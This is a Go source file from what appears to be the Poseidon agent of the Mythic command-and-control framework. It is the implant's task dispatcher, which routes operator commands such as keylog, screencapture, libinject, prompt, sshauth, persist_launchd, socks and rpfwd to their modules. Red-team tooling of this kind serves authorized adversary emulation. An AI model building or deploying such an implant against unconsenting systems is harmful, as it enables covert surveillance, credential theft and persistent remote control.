package tasks

import (
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cat"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cd"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/clipboard"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/clipboard_monitor"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cp"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/curl"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/download"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/drives"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/execute_library"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getenv"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getuser"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/head"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport_call"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jxa"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/keylog"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/keys"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/kill"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/libinject"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/link_tcp"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/link_webshell"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/list_entitlements"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/listtasks"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ls"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mkdir"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mv"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_launchd"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_loginitem"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/runtimeMainThread"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/portscan"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/print_c2"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/print_p2p"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/prompt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ps"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pty"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pwd"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/rm"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/rpfwd"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/run"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/screencapture"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/setenv"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/shell"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sleep"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/socks"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sshauth"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sudo"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/tail"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/tcc_check"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/test_password"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/triagedirectory"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/unlink_tcp"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/unlink_webshell"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/unsetenv"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/update_c2"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/upload"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/xpc"
	"os"
)

var newTaskChannel = make(chan structs.Task, 10)

// listenForNewTask uses NewTaskChannel to spawn goroutine based on task's Run method
func listenForNewTask() {
	for {
		task := <-newTaskChannel
		switch task.Command {
		case "exit":
			os.Exit(0)
		case "shell":
			go shell.Run(task)
		case "screencapture":
			go screencapture.Run(task)
		case "keylog":
			go keylog.Run(task)
		case "download":
			go download.Run(task)
		case "upload":
			go upload.Run(task)
		case "libinject":
			go libinject.Run(task)
		case "ps":
			go ps.Run(task)
		case "sleep":
			go sleep.Run(task)
		case "cat":
			go cat.Run(task)
		case "cd":
			go cd.Run(task)
		case "ls":
			go ls.Run(task)
		case "jxa":
			go jxa.Run(task)
		case "keys":
			go keys.Run(task)
		case "triagedirectory":
			go triagedirectory.Run(task)
		case "sshauth":
			go sshauth.Run(task)
		case "portscan":
			go portscan.Run(task)
		case "jobs":
			go getJobListing(task)
		case "jobkill":
			go killJob(task)
		case "cp":
			go cp.Run(task)
		case "drives":
			go drives.Run(task)
		case "getuser":
			go getuser.Run(task)
		case "mkdir":
			go mkdir.Run(task)
		case "mv":
			go mv.Run(task)
		case "pwd":
			go pwd.Run(task)
		case "rm":
			go rm.Run(task)
		case "getenv":
			go getenv.Run(task)
		case "setenv":
			go setenv.Run(task)
		case "unsetenv":
			go unsetenv.Run(task)
		case "kill":
			go kill.Run(task)
		case "curl":
			go curl.Run(task)
		case "xpc":
			go xpc.Run(task)
		case "socks":
			go socks.Run(task)
		case "listtasks":
			go listtasks.Run(task)
		case "list_entitlements":
			go list_entitlements.Run(task)
		case "jsimport":
			go jsimport.Run(task)
		case "jsimport_call":
			go jsimport_call.Run(task)
		case "persist_launchd":
			go persist_launchd.Run(task)
		case "persist_loginitem":
			go persist_loginitem.Run(task)
		case "link_tcp":
			go link_tcp.Run(task)
		case "unlink_tcp":
			go unlink_tcp.Run(task)
		case "run":
			go run.Run(task)
		case "clipboard_monitor":
			go clipboard_monitor.Run(task)
		case "execute_library":
			go execute_library.Run(task)
		case "rpfwd":
			go rpfwd.Run(task)
		case "print_p2p":
			go print_p2p.Run(task)
		case "print_c2":
			go print_c2.Run(task)
		case "update_c2":
			go update_c2.Run(task)
		case "pty":
			go pty.Run(task)
		case "tcc_check":
			go tcc_check.Run(task)
		case "test_password":
			go test_password.Run(task)
		case "tail":
			go tail.Run(task)
		case "head":
			go head.Run(task)
		case "prompt":
			go runtimeMainThread.DoOnMainThread(prompt.Run, task)
		case "clipboard":
			go clipboard.Run(task)
		case "sudo":
			go sudo.Run(task)
		case "link_webshell":
			go link_webshell.Run(task)
		case "unlink_webshell":
			go unlink_webshell.Run(task)
		default:
			// No tasks, do nothing
			break
		}
	}
}
